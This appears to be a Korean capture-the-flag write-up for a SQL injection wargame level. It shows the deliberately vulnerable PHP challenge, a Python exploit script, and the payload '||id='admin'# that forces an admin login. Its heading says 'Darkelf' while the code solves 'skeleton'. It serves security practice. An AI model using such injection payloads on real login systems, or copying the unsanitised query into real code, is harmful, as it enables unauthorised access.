
## Darkelf Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
$query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id'] == 'admin') solve("skeleton");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['pw'] = "'||id='admin'#"

res = requests.get(url, cookies=cookies, params=params)

if "Clear" in res.text :
    print("[♪] SKELETON Clear")
```
id가 admin이어야 하는데 guest로 되어 있다.  
pw에 `'||id='admin'#`을 넣어주어 id를 admin으로 만들고 그 뒤의 조건은 주석처리 해주면 된다.  
``` php
select id from prob_skeleton where id='guest' and pw=''||id='admin'#' and 1=0
```
쿼리문은 위와 같이 되고 문제가 해결된다.